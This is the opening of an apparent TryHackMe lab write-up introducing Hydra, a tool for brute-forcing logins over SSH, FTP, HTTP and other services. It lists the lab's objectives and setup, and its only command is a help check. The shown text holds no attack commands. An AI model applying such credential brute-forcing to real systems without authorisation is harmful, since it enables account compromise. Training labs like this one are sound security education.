Introduction

In this lab from TryHackMe, we learn how to use Hydra, a powerful password-cracking tool used in penetration testing. Hydra performs brute force attacks against login services such as SSH, FTP, HTTP, and others.

The goal of this lab is to understand how attackers attempt to guess credentials and how security professionals test systems for weak passwords.

Objective

The objective of this lab is to:

Learn what Hydra is

Understand brute force attacks

Use Hydra to crack login credentials

Gain access to a vulnerable service

What is Hydra

Hydra is a fast and flexible online password cracking tool used by penetration testers.

Hydra supports many protocols including:

SSH

FTP

HTTP

SMTP

Telnet

RDP

It works by testing multiple username and password combinations until the correct credentials are found.

Lab Environment

Platform: TryHackMe
Attack Machine: Kali Linux
Target: Vulnerable login service

Tools Used:

Hydra

Wordlists

Terminal

Step 1: Access the Lab Machine

First, start the machine provided in the lab and connect to the AttackBox or your local Kali Linux machine.

Check if Hydra is installed:

hydra -h

If Hydra is installed, the help menu will appear.

